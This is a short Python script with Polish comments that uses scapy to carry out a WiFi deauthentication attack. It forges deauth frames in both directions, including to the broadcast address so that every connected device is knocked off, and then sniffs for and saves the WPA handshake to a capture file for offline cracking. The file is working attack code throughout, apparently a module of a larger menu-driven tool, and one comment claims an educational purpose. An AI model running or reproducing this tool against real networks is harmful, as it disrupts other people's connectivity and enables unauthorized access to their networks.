from scapy.all import *
from rich.console import Console
from rich.panel import Panel
import os

console = Console()

def send_deauth(target_mac, gateway_mac, interface):
    """
    Wysyła ramki Deauth, aby wymusić ponowne połączenie i przechwycić Handshake.
    """
    console.print(f"[bold red][!] WYSYŁANIE DEAUTH:[/bold red] {target_mac} <-> {gateway_mac}")
    
    # Ramka do klienta (podszywamy się pod AP)
    packet1 = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
    # Ramka do AP (podszywamy się pod klienta)
    packet2 = RadioTap()/Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac)/Dot11Deauth(reason=7)
    
    sendp([packet1, packet2], iface=interface, count=50, inter=0.1, verbose=False)

def capture_handshake(interface, bssid, channel, output_name):
    """
    Uruchamia sniffer skupiony na konkretnym kanale i BSSID.
    """
    console.print(Panel(f"Nasłuchiwanie na {bssid} (Kanał: {channel})...", title="HANDSHAKE CAPTURE"))
    
    # Ustawienie kanału na karcie TP-Link
    os.system(f"iwconfig {interface} channel {channel}")
    
    # Funkcja sprawdzająca czy pakiet to EAPOL (Handshake)
    def check_handshake(pkt):
        if pkt.haslayer(EAPOL):
            console.print("[bold green][+] WYKRYTO PAKIET EAPOL (Handshake)! [/bold green]")
            wrpcap(f"{output_name}.cap", pkt, append=True)

    # Uruchomienie deautentykacji w osobnym procesie/wątku, by nie blokować sniffera
    # W celach edukacyjnych wysyłamy raz, by wymusić proces
    send_deauth("FF:FF:FF:FF:FF:FF", bssid, interface) # Deauth na broadcast (wszystkie urządzenia)

    # Sniffing przez 30 sekund lub do przechwycenia
    sniff(iface=interface, prn=check_handshake, timeout=30)
    console.print(f"[yellow][*] Koniec sesji. Plik zapisany jako {output_name}.cap[/yellow]")

# Przykład użycia w Twoim menu:
# capture_handshake("wlan0mon", "AA:BB:CC:DD:EE:FF", 6, "target_net")